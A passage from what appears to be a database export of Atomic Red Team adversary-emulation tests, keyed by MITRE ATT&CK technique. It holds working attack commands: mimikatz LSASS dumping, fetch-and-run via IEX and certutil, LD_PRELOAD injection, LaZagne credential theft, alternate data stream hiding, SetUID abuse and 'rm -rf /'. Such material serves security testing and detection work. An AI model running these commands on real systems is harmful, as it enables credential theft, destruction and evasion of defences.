"input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1055\\\\src\\\\x64\\\\T1055-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Execute\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Shellcode execution via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  $wdApp = New-Object -COMObject \\"Word.Application\\"\\n  $path = $wdApp.Path\\n  Stop-Process -Name \\"winword\\"\\n  if ($path.contains(\\"(x86)\\")) { exit 1 } else { exit 0 }\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{psexec_path} /accepteula \\\\\\\\#{machine} -c #{mimikatz_path} \\"lsadump::lsa /inject /id:500\\" \\"exit\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remote Process Injection in LSASS via mimikatz", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{psexec_path}\\") { exit 0} else { exit 1}\\n"], "input_arguments": [{"key": "machine", "value": "DC1"}, {"key": "mimikatz_path", "value": "%tmp%\\\\mimikatz\\\\x64\\\\mimikatz.exe"}, {"key": "psexec_path", "value": "C:\\\\PSTools\\\\PsExec.exe"}], "execution_status": "Pass"}]}}}}
153	\N		\N	yes	P2	\N	2021-07-30 03:16:19.836985+00	T1574.006	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.006/T1574.006.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.545Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "sudo sed -i '\\\\~#{path_to_shared_library}~d' /etc/ld.so.preload\\n", "command": ["sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Shared Library Injection via /etc/ld.so.preload", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;\\n"], "input_arguments": [{"key": "path_to_shared_library_source", "value": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"}, {"key": "path_to_shared_library", "value": "/tmp/T1574006.so"}], "execution_status": "Pass"}, {"cleanup": "sudo sed -i '\\\\~#{path_to_shared_library}~d' /etc/ld.so.preload\\n", "command": ["LD_PRELOAD=#{path_to_shared_library} ls\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Shared Library Injection via LD_PRELOAD", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\\n"], "input_arguments": [{"key": "path_to_shared_library_source", "value": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"}, {"key": "path_to_shared_library", "value": "/tmp/T1574006.so"}], "execution_status": "Pass"}]}}}}
53	\N		\N	yes	\N	\N	2021-07-02 09:48:00.47025+00	T1110.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Procdump tool is used for attack to get credential dump."], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.693Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["Mimikatz tool is used for attack to get credential dump."], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.706Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
329	\N	\N	\N	yes	P2	\N	2021-08-30 14:46:29.843494+00	T1069.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "NA", "command": ["net user /domain\\nnet group /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate all accounts (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net user /domain\\nget-localgroupmember -group Users\\nget-aduser -filter *\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate all accounts via PowerShell (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["query user /SERVER:#{computer_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate logged on users via CMD (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "computer_name", "value": "$env:COMPUTERNAME"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null\\nGet-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \\"^ADRecon-Report-\\"} | Remove-Item -Force -Recurse\\n", "command": ["Invoke-Expression #{adrecon_path}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Automated AD Recon (ADRecon)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adrecon_path", "value": "$env:TEMP\\\\ADRecon.ps1"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind -Listing password policy", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -sc admincountdmp\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory Admins", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -f (objectcategory=person)\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory User Objects", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{adfind_path} -sc exchaddresses\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Adfind - Enumerate Active Directory Exchange AD Objects", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "adfind_path", "value": "PathToAtomicsFolder\\\\T1087.002\\\\src\\\\AdFind.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net user administrator /domain\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate Default Domain Admin Details (Domain)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Enumerate Active Directory for Unconstrained Delegation", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Try {\\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\\n    exit 0\\n}\\nCatch {\\n    exit 1\\n}\\n"], "input_arguments": [{"key": "domain", "value": "contoso.com"}, {"key": "uac_prop", "value": 524288}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["wmic useraccount get /ALL /format:csv"], "executor": ["Cmd"], "platform": "Windows", "file_name": "", "pre_command": [], "ability_name": "WMI Reconnaissance Users", "created_date": "30/08/2021", "post_command": [], "modified_date": "30/08/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net localgroup\\nnet localgroup \\"Administrators\\""], "executor": ["Cmd"], "platform": " Windows", "file_name": "", "pre_command": [], "ability_name": "Basic Permission Groups Discovery Windows (Local)", "created_date": "30/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
297	\N		\N	yes	P2	\N	2021-07-29 05:33:56.211489+00	T1134.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "TT", "command": ["TT"], "executor": ["Psh"], "platform": "", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
184	\N	\N	\N	yes	\N	\N	2021-08-30 15:18:45.096957+00	T1124	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["net time \\\\localhost"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.978Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
168	\N		\N	yes	P2	\N	2021-07-30 03:11:50.54555+00	T1070.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.770Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -f #{file_to_delete}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Linux/macOS", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_delete", "value": "/tmp/victim-files/a"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf #{folder_to_delete}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Linux/macOS", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "folder_to_delete", "value": "/tmp/victim-files"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["shred -u #{file_to_shred}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Overwrite and delete a file with shred", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_shred", "value": "/tmp/victim-shred.txt"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["del /f #{file_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{file_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rmdir /s /q #{folder_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{folder_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -path #{file_to_delete}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_to_delete", "value": "$env:TEMP\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path #{folder_to_delete} -Recurse\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "$env:TEMP\\\\deleteme_folder_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf / --no-preserve-root > /dev/null 2> /dev/null\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Delete Filesystem - Linux", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path (Join-Path \\"$Env:SystemRoot\\\\prefetch\\\\\\" (Get-ChildItem -Path \\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\" -Name)[0])\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete Prefetch File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item #{teamviewer_log_file}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete TeamViewer Log Files", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "teamviewer_log_file", "value": "$env:TEMP\\\\TeamViewer_54.log"}], "execution_status": "Pass"}]}}}}
156	\N		sh	yes	P2	\N	2021-07-29 04:46:35.520049+00	T1548.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"cp ./atomics/T1548.001/src/hello.c /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\nsudo chmod g+s /tmp/hello\\n/tmp/hello\\", \\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.001/T1548.001.md\\"]"], "executor": ["shell"], "platform": "", "file_name": null, "platforms": "Linux", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.595Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "sudo rm /tmp/hello\\nsudo rm /tmp/hello.c\\n", "command": ["cp #{payload} /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\n/tmp/hello\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Make and modify binary from C source", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "payload", "value": "PathToAtomicsFolder/T1548.001/src/hello.c"}], "execution_status": "Pass"}, {"cleanup": "sudo rm #{file_to_setuid}\\n", "command": ["sudo touch #{file_to_setuid}\\nsudo chown root #{file_to_setuid}\\nsudo chmod u+s #{file_to_setuid}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Set a SetUID flag on file", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_setuid", "value": "/tmp/evilBinary"}], "execution_status": "Pass"}, {"cleanup": "sudo rm #{file_to_setuid}\\n", "command": ["sudo touch #{file_to_setuid}\\nsudo chown root #{file_to_setuid}\\nsudo chmod g+s #{file_to_setuid}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Set a SetGID flag on file", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_setuid", "value": "/tmp/evilBinary"}], "execution_status": "Pass"}]}}}}
313	\N		\N	yes	P2	\N	2021-07-30 02:49:59.489866+00	T1055.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" 